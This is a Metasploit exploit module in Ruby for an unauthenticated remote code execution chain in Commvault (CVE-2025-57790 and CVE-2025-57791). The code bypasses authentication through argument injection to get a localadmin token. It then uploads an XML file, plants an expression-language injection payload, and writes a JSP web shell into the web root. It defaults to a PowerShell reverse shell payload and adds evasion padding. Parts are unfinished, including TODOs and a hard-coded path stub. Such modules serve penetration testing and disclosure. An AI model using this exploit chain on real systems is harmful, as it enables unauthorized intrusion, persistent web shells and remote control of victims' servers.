##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Commvault Command-Line Argument Injection to Traversal Remote Code Execution',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution exploit chain for Commvault,
          tracked as CVE-2025-57790 and CVE-2025-57791. A command-line injection permits unauthenticated
          access to the 'localadmin' account, which then facilitates code execution via expression
          language injection. This module executes in the context of 'NETWORK SERVICE' on Windows.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Sonny Macdonald', # Original discovery
          'Piotr Bazydlo', # Original discovery
          'remmons-r7' # MSF exploit
        ],
        'References' => [
          ['CVE', '2025-57790'],
          ['CVE', '2025-57791'],
          # Argument injection advisory
          ['URL', 'https://documentation.commvault.com/securityadvisories/CV_2025_08_1.html'],
          # Path traversal advisory
          ['URL', 'https://documentation.commvault.com/securityadvisories/CV_2025_08_2.html'],
          # Non-blind expression language payload (from an Ivanti EPMM exploit chain)
          ['URL', 'https://blog.eclecticiq.com/china-nexus-threat-actor-actively-exploiting-ivanti-endpoint-manager-mobile-cve-2025-4428-vulnerability']
        ],
        'DisclosureDate' => '2025-08-19',
        # Runs as the 'NETWORK SERVICE' user on Windows, variable user privileges (could be privileged) on Linux
        'Privileged' => false,
        'Platform' => ['unix', 'linux', 'windows'],
        'Arch' => [ARCH_CMD],
        'DefaultTarget' => 0,
        'Targets' => [
          [
            'Default', {
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              },
              'Payload' => {
                'BadChars' => '&'
              }
            }
          ]
        ],
        'Notes' => {
          # Confirmed to work multiple times in a row
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          # The log files will contain IOCs, including the written web shell path
          # If successful, an abnormal XML file and web shell will be written to disk
          # The localadmin user's description will be updated to include the expression language payload
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The base path to Commvault', '/']),
        OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]),
        # Required for exploitation, but the value isn't required since the exploit will attempt to autodetect
        OptString.new('HOSTNAME', [false, 'The name of the host system (necessary for exploitation, will attempt to autodetect)'])
      ]
    )
  end

  def hostname
    datastore['HOSTNAME']
  end

  def check_commvault_info
    vprint_status('Attempting to query the publicLink.do endpoint')
    send_request_cgi(
      'method' => 'GET',
      # The 'activeMQConnectionURL' leak depicted in the finder blog post is not present on many systems by default
      # The 'WebConsoleURL' value often leaks the system host name (though it may only contain the IP address or web domain)
      'uri' => normalize_uri(target_uri.path, 'commandcenter', 'publicLink.do')
    )
  end

  def check
    # Only attempt to leak and autodetect the host name if it isn't manually set by user
    if hostname.blank?
      # Query an unauthenticated web API endpoint to attempt to extract the host name
      res = check_commvault_info
      return CheckCode::Unknown('Failed to get a response from the target') unless res

      # If the response body contains "WebConsoleURL", we assume it's Commvault
      if res.code == 200 && res.body.include?('WebConsoleURL')
        vprint_status('The server returned a body that included the string WebConsoleURL, looks like Commvault')

        # The WebConsoleURL value often contains the system host name, and it's more reliably present than activeMQConnectionURL (from finder writeup)
        # We grab that string and hope it's the host name, rather than an IP address or domain name
        regex = %r{"WebConsoleURL":"http.?://([^:]+):?\d?\d?\d?\d?\d?/webconsole/clientDetails/fsDetails.do}
        hostname = res.body.scan(regex)[0][0]

        # If the regex fails to extract a host name, and since we don't have a user-provided one, we return Detected
        if hostname.blank?
          return CheckCode::Detected('The target server is Commvault, but the host name could not be automatically leaked')
        end

      # If the target doesn't serve the expected publicLink.do API endpoint, we assert that it's not Commvault
      else
        return CheckCode::Safe('The target returned an unexpected response for publicLink.do and does not appear to be Commvault')
      end
    end

    # By this point, we have an unvalidated host name, provided by either the user or the autodetect
    vprint_status("System host name value for authentication bypass: #{hostname}")

    # Attempt to use the host name in hand to retrieve a localadmin token
    res = bypass_authentication(hostname)
    return CheckCode::Unknown('Failed to get a response from the target') unless res

    # If the response is 200 and includes the token prefix, success. Otherwise, return inconclusively as Detected
    if res.code == 200 && res.body.include?('"QSDK ')
      return CheckCode::Vulnerable('Successfully bypassed authentication')
    else
      return CheckCode::Detected('The authentication bypass failed - either the target is not vulnerable or the host name is incorrect')
    end
  end

  def bypass_authentication(hostname)
    # Bypass authentication and return a valid token for the internal localadmin user
    vprint_status("Attempting to mint a localadmin token using hostname: #{hostname}")

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'commandcenter', 'api', 'Login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        # Username must contain the valid system host name
        'username' => "#{hostname}_localadmin__",
        # Since the malicious password to bypass authentication is a static string, randomly pad with spaces to subvert easy static detections
        'password' => Base64.strict_encode64("#{' ' * rand(1..20)}a#{' ' * rand(1..20)}-localadmin#{' ' * rand(1..20)}"),
        # Must contain the valid system host name, spaces cannot be padded
        'commserver' => "#{hostname} -cs #{hostname}"
      }.to_json
    )
  end

  def leak_full_path
    # Since we need to provide a full filesystem path, we need to know whether the host is Windows or Linux
    # We'll attempt to use an authenticated API to leak this information
    return 'C:'
  end

  def execute_command(hostname, uid, cmd, token, _path)
    # TODO: validate that OS is right and handle gracefully if not

    # This EL injection payload was taken from EITW of an Ivanti vuln. It's non-blind, which is a nice benefit
    # Note that ampersand is a bad character in the injection context
    payload = "${''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('#{cmd}').getInputStream()).useDelimiter('%5C%5CA').next()}"

    # Weaponize unauthenticated file upload to create an XML file that defines an operation to retrieve user details
    user_details_op_xml = "<App_GetUserPropertiesRequest level=\"30\">\r\n\t<user userName=\"#{hostname}_localadmin__\" /></App_GetUserPropertiesRequest>"
    message = Rex::MIME::Message.new

    # These can be anything. Random hex str to avoid signatures where possible
    random_str = rand_text_hex(8)
    message.add_part(random_str, nil, nil, 'form-data; name="username"')
    message.add_part(random_str, nil, nil, 'form-data; name="password"')
    message.add_part(random_str, nil, nil, 'form-data; name="ccid"')
    message.add_part(random_str, nil, nil, 'form-data; name="uploadToken"')

    # File contents to write TODO: need to set content type maybe?
    message.add_part(user_details_op_xml, nil, nil, "form-data; name=\"file\"; filename=\"#{random_str}.xml\"")

    vprint_status("Uploading XML file: #{user_details_op_xml}")

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'commandcenter', 'metrics', 'metricsUpload.do'),
      'ctype' => "multipart/form-data; boundary=#{message.bound}",
      'data' => message.to_s
    }, 5)

    fail_with(Failure::Unknown, 'No response when uploading XML file') unless res

    if res.code != 200
      vprint_status("Unexpected status code: #{res.code}")
      fail_with(Failure::UnexpectedReply, 'Non-200 status code when uploading XML file')
    end

    # TODO: detect Windows or Linux

    # The localadmin user's description is set to EL payload
    xml_data = "<App_UpdateUserPropertiesRequest><users><AppMsg.UserInfo><userEntity><userId>#{uid}</userId></userEntity><description>#{payload}</description></AppMsg.UserInfo></users></App_UpdateUserPropertiesRequest>"
    vprint_status("Updating user description: #{xml_data}")

    res = send_request_cgi(
      'method' => 'POST',
      'ctype' => 'application/xml',
      'uri' => normalize_uri(target_uri.path, 'commandcenter', 'RestServlet', 'User', uid),
      'headers' => {
        'Authtoken' => token
      },
      'data' => xml_data
    )

    fail_with(Failure::Unknown, 'No response when setting user description') unless res

    if res.code != 200
      fail_with(Failure::UnexpectedReply, 'The target did not return a 200 code when updating user description')
    end

    # TODO: figure out a web API that localadmin is scoped for
    leak_full_path

    # Move XML file to web shell
    qcommand_op = "qoperation execute -af C:\\Program Files\\Commvault\\ContentStore\\Reports\\MetricsUpload\\Upload\\#{random_str}\\#{random_str}.xml -file C:\\Program Files\\Commvault\\ContentStore\\Apache\\webapps\\ROOT\\#{random_str}.jsp"
    res = send_request_cgi(
      'method' => 'POST',
      'ctype' => 'text/plain',
      'uri' => normalize_uri(target_uri.path, 'commandcenter', 'RestServlet', 'QCommand'),
      'headers' => {
        'Authtoken' => token
      },
      'data' => qcommand_op
    )

    fail_with(Failure::Unknown, 'No response when creating web shell') unless res

    if res.code != 200 || !res.body.include?('Operation Successful.Results written')
      fail_with(Failure::UnexpectedReply, 'The target did not return a 200 code with success message when creating web shell')
    end

    # Access the web shell to trigger remote code execution
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "#{random_str}.jsp")
    )

    fail_with(Failure::Unknown, 'No response when accessing web shell') unless res
  end

  def exploit
    # Only attempt to leak and autodetect the host name if it isn't manually set by user
    if hostname.blank?
      # Query an unauthenticated web API endpoint to attempt to extract the host name
      res = check_commvault_info
      fail_with(Failure::Unknown, 'Failed to get a response from the target') unless res

      # If the response body contains "WebConsoleURL", we assume it's Commvault
      if res.code == 200 && res.body.include?('WebConsoleURL')
        vprint_status('The server returned a body that included the string WebConsoleURL, looks like Commvault')

        # The WebConsoleURL value often contains the system host name, and it's more reliably present than activeMQConnectionURL (from finder writeup)
        # We grab that string and hope it's the host name, rather than an IP address or domain name
        regex = %r{"WebConsoleURL":"http.?://([^:]+):?\d?\d?\d?\d?\d?/webconsole/clientDetails/fsDetails.do}
        hostname = res.body.scan(regex)[0][0]

        # If the regex fails to extract a host name, and since we don't have a user-provided one, we return NoAccess
        if hostname.blank?
          fail_with(Failure::NoAccess, 'The target server is Commvault, but the host name could not be automatically leaked')
        end

      # If the target doesn't serve the expected publicLink.do API endpoint, we assert that it's not Commvault
      else
        fail_with(Failure::NotFound, 'The target returned an unexpected response for publicLink.do and does not appear to be Commvault')
      end
    end

    # By this point, we have an unvalidated host name, provided by either the user or the autodetect
    vprint_status("System host name value for authentication bypass: #{hostname}")

    # Attempt to use the host name in hand to retrieve a localadmin token
    res = bypass_authentication(hostname)
    fail_with(Failure::Unknown, 'Failed to get a response from the target') unless res

    # If the response is 200 and includes the token prefix, grab that token
    if res.code == 200 && res.body.include?('"QSDK ')
      print_good('Successfully bypassed authentication')

      # Extract token for later use (cookie is also persisted)
      regex = /(QSDK [a-zA-Z0-9]+)/
      token = res.body.scan(regex)[0][0]
      vprint_status("Admin token: #{token}")

      # Extract the aliasName field, which contains the dynamic user ID number (typically single digit)
      regex = /aliasName[=:]"(\d\d?)/
      admin_uid = res.body.scan(regex)[0][0]
      vprint_status("Extracted localadmin user ID number: #{admin_uid}")

    # If the response doesn't contain the admin token, the exploit has failed
    else
      fail_with(Failure::NoAccess, 'The authentication bypass failed - either the target is not vulnerable or the host name is incorrect')
    end

    execute_command(hostname, admin_uid, payload.encoded, token, 'C:\\Program Files\\Commvault\\ContentStore\\Reports\\MetricsUpload\\Upload\\')
  end
end
